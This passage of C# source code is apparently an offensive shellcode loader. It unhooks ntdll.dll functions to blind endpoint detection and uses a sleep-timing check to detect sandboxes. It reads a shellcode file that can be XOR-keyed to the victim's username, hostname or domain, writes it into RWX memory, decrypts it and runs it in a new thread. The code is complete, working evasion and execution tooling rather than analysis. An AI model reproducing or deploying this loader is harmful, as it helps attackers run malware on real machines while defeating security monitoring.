        private unsafe static void unhook_func(KeyValuePair<string, IntPtr> func, Process proc)
        {
            try
            {
                byte* ptr = (byte*)func.Value;
                IntPtr addr = func.Value;
                IntPtr size = (IntPtr)16;
                Console.Write("     |-> STUB " + func.Key + ":");
                IntPtr syscall = DI.Generic.GetSyscallStub(func.Key);
                byte* syscall_ptr = (byte*)syscall;
                Console.Write(" => RWX");
                uint oldProtect = DI.Native.NtProtectVirtualMemory(
                    proc.Handle,
                    ref addr,
                    ref size,
                    0x40 // Page Execute ReadWrite
                );
                Console.Write(" => WRITE");
                for (int i = 0; i < 16; i++)
                {
                    ptr[i] = syscall_ptr[i];
                }
                Console.Write(" => RX");
                DI.Native.NtProtectVirtualMemory(
                    proc.Handle,
                    ref addr,
                    ref size,
                    oldProtect
                );
                Console.WriteLine(" => UNHOOKED!");
            }
            catch (Exception e)
            {
                Console.WriteLine(" => EXCEPTION!");
                Console.WriteLine(e.Message);
                return;
            }
        }

        public static void Unhook()
        {
            Console.WriteLine("Checking hooking of ntdll.dll...");
            // Get the base address of ntdll.dll in our own process
            IntPtr ntdllBase = GetNTDLLBase();
            if (ntdllBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Couldn't find ntdll.dll");
                return;

            }
            else { Console.WriteLine("NTDLL Base Address: 0x{0:X}", ntdllBase.ToInt64()); }

            // Get the address of each of the target functions in ntdll.dll
            IDictionary<string, IntPtr> funcAddresses = GetFuncAddress(ntdllBase, functions);
            Process proc = Process.GetCurrentProcess();
            // Check the first DWORD at each function's address for proper SYSCALL setup
            Console.WriteLine("==============================================================");
            foreach (KeyValuePair<string, IntPtr> func in funcAddresses)
            {
                if (!check_safe_func(func))
                {
                    unhook_func(func, proc);
                    check_safe_func(func);
                }
            }
            Console.WriteLine("==============================================================");
        }

        static IntPtr GetNTDLLBase()
        {
            Process hProc = Process.GetCurrentProcess();
            ProcessModule module = hProc.Modules.Cast<ProcessModule>().SingleOrDefault(m => string.Equals(m.ModuleName, "ntdll.dll", StringComparison.OrdinalIgnoreCase));
            if (module != null && module.BaseAddress != null)
            {
                return module.BaseAddress;
            }
            else
            {
                return IntPtr.Zero;
            }
        }

        static IDictionary<string, IntPtr> GetFuncAddress(IntPtr hModule, string[] functions)
        {
            IDictionary<string, IntPtr> funcAddresses = new Dictionary<string, IntPtr>();
            foreach (string function in functions)
            {
                try
                {
                    IntPtr funcPtr = DI.Generic.GetExportAddress(hModule, function);
                    funcAddresses.Add(function, funcPtr);
                }
                catch (MissingMethodException)
                {
                    Console.WriteLine("[-] Couldn't locate the address for {0}!", function);
                }
            }

            return funcAddresses;
        }
    }

    public class Program
    {

        public static byte[] StringToByteArray(string hex)
        {
            byte[] outr = new byte[(hex.Length / 2) + 1];
            for (int i = 0; i < hex.Length; i += 2)
            {
                outr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return outr;
        }

        public unsafe static void writeHexPayloadToMem(string hex, ref IntPtr addr)
        {
            byte* ptr = (byte*)addr;
            for (int i = 0; i < hex.Length; i += 2)
            {
                ptr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
        }

        public unsafe static void writeBinPayloadToMem(byte[] payload, ref IntPtr addr)
        {
            byte* ptr = (byte*)addr;
            for (int i = 0; i < payload.Length; i++)
            {
                ptr[i] = payload[i];
            }
        }

        public unsafe static void decryptKeying(ref IntPtr addr, string key, UInt32 size)
        {
            byte[] keybytes = Encoding.ASCII.GetBytes(key);
            byte* ptr = (byte*)addr;
            for (int i = 0; i < size; i++)
            {
                ptr[i] = (byte)(ptr[i] ^ keybytes[i % keybytes.Length]);
            }
        }

        public enum KeyingMode
        {
            KEYING_NONE = 0,
            KEYING_PASSWORD = 1,
            KEYING_USERNAME = 2,
            KEYING_HOSTNAME = 3,
            KEYING_DOMAIN = 4
        }

        public static bool IsLOLZFormat(byte[] content)
        {
            byte[] magic = Encoding.ASCII.GetBytes("LOLZ");
            if (content.Length < magic.Length) return false;
            for (int i = 0; i<magic.Length; i++)
            {
                if (content[i] != magic[i]) return false;
            }
            return true;
        }

        public static string[] LoadLOLZFile(byte[] content)
        {
            try
            {
                string[] lines = System.Text.Encoding.UTF8.GetString(content).Replace("\r\n", "\n").Split('\n');
                if (lines.Length != 2)
                {
                    Console.Error.WriteLine("Cannot parse shellcode file, wrong number of lines");
                    return null;
                }
                return new string[] { lines[0].Substring(4), lines[1] };
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Cannot parse shellcode file.");
                Console.Error.WriteLine(e.Message);
            }
            return null;
        }

        public static string GetKey(string mode, string password = null)
        {
            StringBuilder keybuilder = new StringBuilder();
            foreach (char c in mode)
            {
                KeyingMode m = (KeyingMode)int.Parse(c.ToString());
                switch (m)
                {
                    case KeyingMode.KEYING_NONE:
                        return null;
                    case KeyingMode.KEYING_USERNAME:
                        keybuilder.Append(Environment.UserName);
                        break;
                    case KeyingMode.KEYING_HOSTNAME:
                        keybuilder.Append(Environment.MachineName);
                        break;
                    case KeyingMode.KEYING_DOMAIN:
                        keybuilder.Append(Environment.UserDomainName);
                        break;
                    case KeyingMode.KEYING_PASSWORD:
                        if (password != null)
                        {
                            keybuilder.Append(password);
                        }
                        else
                        {
                            //Console.Write("Password: ");
                            //keybuilder.Append(Console.ReadLine().Trim(new[] { '\n', '\r', ' ', '\t' }));
                            Console.Error.WriteLine("Password functionality unsupported at this time.");
                        }
                        break;
                }
            }
            return keybuilder.ToString();
        }
        public static int Main()
        {
            // PARAMS
            string filename = "C:\\Users\\Public\\BIPCD\\shellcode.bin";
            bool unhook = true;
            string password = null;

            if (!File.Exists(filename))
            {
                Console.Error.WriteLine("Specified filename does not exist: " + filename);
                return -1;
            }

            // Load shellcode from file
            byte[] rawcontent;
            try
            {
                rawcontent = File.ReadAllBytes(filename);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Unreadable shellcode file.");
                Console.Error.WriteLine(e.Message);
                return -2;
            }
            return Go(rawcontent);
        }


        public static int Go(byte[] rawcontent)
        {
            string key = null;
            string strpayload = null;
            bool unhook = true;
            bool LOLZFormat = IsLOLZFormat(rawcontent);
            UInt32 payloadSize;
            if (LOLZFormat)
            {
                Console.WriteLine("Detected smart shellcode file");
                string[] content = LoadLOLZFile(rawcontent);
                key = GetKey(content[0], null);
                strpayload = content[1];
                payloadSize = Convert.ToUInt32(strpayload.Length / 2);
            }
            else
            {
                Console.WriteLine("Detected standard file");
                payloadSize = Convert.ToUInt32(rawcontent.Length);
            }

            // Unhook
            if (unhook) Unhooker.Unhook();

            // Detect EDR
            DateTime t1 = DateTime.Now;
            object[] parameters = { (uint)2000 };
            DI.Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Delegates.Sleep), ref parameters);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return 255;
            }


            // Encrypt: https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'GMT'%7D,'Standard',false)To_Hex('None',0)
            // Allocate memory
            if (key == null)
            {
                Console.WriteLine("Shellcode not keyed.");
            }
            else
            {
                Console.WriteLine("Generated XOR key: " + key);
            }
            Console.WriteLine("Allocating memory, payload length: " + payloadSize);

            IntPtr addr = IntPtr.Zero;
            IntPtr region_size = (IntPtr)payloadSize;
            DI.Native.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref region_size, (uint)0x3000, (uint)0x40);

            if (addr == IntPtr.Zero)
            {
                Console.Error.WriteLine("Allocation failed :(");
                return 255;
            }
            else
            {
                Console.WriteLine("Allocation successful!");
            }

            // Write shellcode into memory
            if (LOLZFormat)
            {
                writeHexPayloadToMem(strpayload, ref addr);
            }
            else
            {
                writeBinPayloadToMem(rawcontent, ref addr);
            }

            // Decrypt shellcode
            if (key != null)
            {
                decryptKeying(ref addr, key, payloadSize);
            }

            // Launch
            Console.WriteLine("Starting thread.");
            IntPtr threadId = IntPtr.Zero;
            IntPtr hThread = DI.Win32.CreateRemoteThread(
                Process.GetCurrentProcess().Handle,
                IntPtr.Zero,
                0,
                addr,
                IntPtr.Zero,
                0,
                ref threadId
                );

            Console.WriteLine("Executing shellcode now!");
            Console.WriteLine();
            object[] wait_parameters = new object[]
            {
            hThread,
            0xFFFFFFFF
            };
            DI.Generic.DynamicAPIInvoke("kernel32.dll", "WaitForSingleObject", typeof(Delegates.WaitForSingleObject), ref wait_parameters);
            Console.WriteLine("DONE!");
            return 0;
        }
    }
}